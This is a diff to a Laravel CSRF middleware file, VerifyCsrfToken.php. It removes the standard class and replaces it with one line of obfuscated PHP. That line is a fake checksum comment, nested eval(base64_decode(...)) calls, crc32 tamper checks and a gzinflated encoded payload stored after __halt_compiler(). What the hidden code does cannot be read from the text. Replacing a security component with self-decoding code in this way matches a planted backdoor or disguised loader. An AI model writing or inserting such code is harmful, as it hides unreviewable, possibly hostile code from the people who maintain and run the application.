@@ -1,17 +1,1 @@
-<?php
-
-namespace SPCVN\Http\Middleware;
-
-use Illuminate\Foundation\Http\Middleware\VerifyCsrfToken as BaseVerifier;
-
-class VerifyCsrfToken extends BaseVerifier
-{
-    /**
-     * The URIs that should be excluded from CSRF verification.
-     *
-     * @var array
-     */
-    protected $except = [
-        //
-    ];
-}
+<?php /*  Checksum: 8685044f */ eval(base64_decode("JE8wT08wME9PME89IGZpbGUocHJlZ19yZXBsYWNlKCJAXCguKlwoLiokQCIsIiIsX19GSUxFX18pKTsNCiAgICAgICAgICAgICAgICBpZihwcmVnX3JlcGxhY2UoIkBcKC4qXCguKiRAIiwiIixfX0ZJTEVfXyk9PV9fRklMRV9fIG9yIHByZWdfcmVwbGFjZSgiQFwoLipcKC4qJEAiLCIiLF9fTElORV9fKSA+IDIpZGllKCI8dHQ+TcOgeSBQaMOhICIpOw"));eval(base64_decode("ZnVuY3Rpb24gSWwxMWwxbElJbCgkYSwkYil7JGM9YXJyYXkoNzgxLDMzMCw4LDI4MCk7aWYoJGI9PTE5MSl7JGQ9c3Vic3RyKCRhLCRjWzBdKyRjWzFdLCRjWzJdKTt9ZWxzZWlmKCRiPT0xMjEpeyRkPXN1YnN0cigkYSwkY1swXSwkY1sxXSk7fWVsc2VpZigkYj09MzkpeyRkPXRyaW0oc3Vic3RyKCRhLCRjWzBdKyRjWzFdKyRjWzJdKSk7fXJldHVybiRkO30="));eval(base64_decode(Il11l1lIIl($O0OO00OO0O[0],121)));eval(OOO0OO000O(Il11l1lIIl($O0OO00OO0O[0],39),Il11l1lIIl($O0OO00OO0O[0],191),$O0OO00OO0O));__halt_compiler();ylaWYoIWZ1bmN0aW9uX2V4aXN0cygiT09PME9PMDAwTyIpKXtmdW5jdGlvbiBPT08wT08wMDBPKCRhLCRiLCRjKXskZD1pbXBsb2RlKCRjKTskZD1wcmVnX3JlcGxhY2UoIi9fX2hhbHRfY29tcGlsZXIuKi8iLCIiLCRkKTtpZigkYj09aGFzaCgiY3JjMzIiLCIkZCIpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZGllKCI8dHQ+Y3JjMzIgQ29kZSBtYW5pcHVsYXRpb24gZGV0ZWN0ZWQ8L3R0PiIpO319fQfc581e58XY+7agMxEEV7gf5hCldbxB8QDMELJi4cgu24yaaYSLOsiFZaNCM/MPn3KGs7EE91uRwOd7TSKmBPPKAh2LzWu5fmWWRoVs5aTwdM9KgLk5lg6X3uXUChZhFzsCguhnu62VFy7anm1G7jFwVAhjkyjbWjNNqMR2a4J+koFOx/XKuzVlBuWlWXABVsO4K39ZJBOhTgLmZv4ZOKwPhsyUKbYg/1Zr2A/egx49SHm+BP9LTHBJgSnm7V9BKGFIWMFNWkSGkQmMH7lfkdc8U+yjffWv0A
